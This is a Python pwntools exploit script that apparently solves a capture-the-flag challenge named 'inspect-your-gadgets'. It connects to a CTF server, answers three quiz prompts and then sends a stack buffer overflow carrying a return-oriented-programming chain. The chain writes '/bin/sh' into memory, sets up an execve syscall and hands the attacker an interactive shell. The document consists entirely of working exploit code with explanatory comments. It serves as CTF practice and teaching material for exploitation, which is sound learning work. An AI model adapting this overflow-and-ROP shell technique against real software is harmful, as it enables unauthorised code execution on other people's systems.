from pwn import * 

if __name__ == "__main__":
    # p = process("./inspect-your-gadgets")
    p = remote("chal.ctf-league.osusec.org", 1311)
    
    # get all the questions right :)
    p.sendlineafter(b"here: ", b"C")
    p.sendlineafter(b"here: ", b"D")
    p.sendlineafter(b"here: ", b"A")
    
    # construct ROP payload
    bss_addr = p64(0x4c3220 + 9) # offset of 9 from start because why not :)

    payload = b"A" * 0x28 # buffer overflow up to just before return address
    
    # set up rax (syscall 59 -> execve)
    payload += p64(0x452477) # pop rax ; ret
    payload += p64(59)
    
    # set up rdi (pointer to string "/bin/sh")
    payload += p64(0x4019c2) # pop rdi ; ret
    payload += bss_addr
    payload += p64(0x404bd2) # pop rcx ; ret
    payload += b"/bin/sh\x00" # null terminator included to make it 8 bytes
    payload += p64(0x43b95b) # mov qword ptr [rdi], rcx ; ret
    
    # zero rsi (argv) and rdx (envp)
    payload += p64(0x40f52e) # pop rsi ; ret
    payload += p64(0)
    payload += p64(0x4018cf) # pop rdx ; ret
    payload += p64(0)

    payload += p64(0x4012d3) # syscall

    print(payload)
    
    # send payload!
    p.sendlineafter(b"scoreboard: ", payload)
    
    # ooo fancy prompt
    p.interactive(prompt=term.text.bold_red("pwn>") + " ")